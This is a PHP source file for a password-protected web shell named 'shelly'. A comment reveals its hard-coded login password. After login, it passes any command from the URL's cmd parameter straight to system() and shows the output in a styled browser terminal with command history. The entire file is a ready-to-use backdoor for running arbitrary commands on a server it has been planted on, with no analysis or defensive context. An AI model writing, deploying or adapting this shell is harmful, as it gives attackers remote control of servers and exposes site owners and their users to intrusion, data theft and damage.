<?php
session_start();

// password = kitty
$PASSWORD = "dcc0054dc1ccade29e1d743a7108996275c4709f6e8ff3169b787d726cd5701694718271856c956e774de4e0dcd05ce2975e5c65bbcfc3fb9c5ea6c0a58e7062";

if (isset($_POST['password'])) {
    if (hash('sha512', $_POST['password']) === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Wrong password";
    }
}

if (!isset($_SESSION['logged_in'])):
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Consolas, "Courier New", monospace;
        }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0f1115;
            color: #e5e7eb;
        }

        .login-container {
            text-align: center;
        }

        input[type="password"] {
            padding: 15px 20px;
            font-size: 16px;
            border-radius: 12px;
            border: 1px solid #1f2937;
            background-color: #111827;
            color: #e5e7eb;
            outline: none;
            width: 250px;
            text-align: center;
        }

        input[type="password"]::placeholder {
            color: #6b7280;
        }

        input[type="submit"] {
            margin-top: 15px;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 12px;
            border: none;
            background-color: #2563eb;
            color: white;
            cursor: pointer;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #1d4ed8;
        }

        .error {
            color: #f87171;
            margin-bottom: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <?php if(isset($error)): ?>
            <div class="error"><?= $error ?></div>
        <?php endif; ?>
        <form method="POST" action="">
            <input type="password" name="password" placeholder="password" autofocus>
        </form>
    </div>
</body>
</html>
<?php
exit;
endif;


if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

if (isset($_GET['cmd']) && trim($_GET['cmd']) !== '') {
    $cmd = $_GET['cmd'];

    if ($cmd === 'clear') {
        $_SESSION['history'] = [];
    } else if ($cmd === 'exit') {
        session_destroy(); 
        header("Location: " . $_SERVER['PHP_SELF']);
        exit; 
    } else {
        ob_start(); 
        system($cmd);
        $output = ob_get_clean();
        $formatted_output = "<span>$</span>" . htmlspecialchars($cmd) . "<br><br>" . nl2br(htmlspecialchars($output));
        $_SESSION['history'][] = $formatted_output;
    }
}


?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>shelly</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        * { box-sizing:border-box; margin:0; padding:0; font-family: Consolas, "Courier New", monospace;}
        body { height:100vh; display:flex; flex-direction:column; background-color:#0f1115; color:#e5e7eb;}
        #output { flex:1; margin:20px; padding:20px; overflow-y:auto; background-color:#0b0d12; border:1px solid #1f2937; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.4);}
        .output-line { margin-bottom:10px; padding:10px 14px; background-color:#111827; border-radius:10px; font-size:14px; word-break:break-word;}
        .output-line span { color:#3b82f6; margin-right:6px;}
        #command_line { padding:15px 20px 25px; background-color:#0f1115;}
        #command_line form { display:flex; align-items:center; gap:10px;}
        #cmd { flex:1; padding:12px 14px; font-size:15px; color:#e5e7eb; background-color:#111827; border:1px solid #1f2937; border-radius:8px; outline:none;}
        #cmd::placeholder { color:#6b7280;}
        #cmd:focus { border-color:#3b82f6;}
        .send-btn { width:46px; height:46px; border-radius:50%; border:none; background-color:#2563eb; color:white; cursor:pointer; display:flex; align-items:center; justify-content:center;}
        .send-btn:hover { background-color:#1d4ed8;}
        .send-btn i { font-size:24px;}
    </style>
</head>
<body>
<div id="output">
    <?php foreach ($_SESSION['history'] as $line): ?>
        <div class="output-line"><?= $line ?></div>
    <?php endforeach; ?>
</div>


<div id="command_line">
    <form method="GET" action="">
        <input type="text" name="cmd" id="cmd" autofocus placeholder="Enter command...">
        <button type="submit" class="send-btn">
            <i class="material-icons">send</i>
        </button>
    </form>
</div>

</body>
</html>
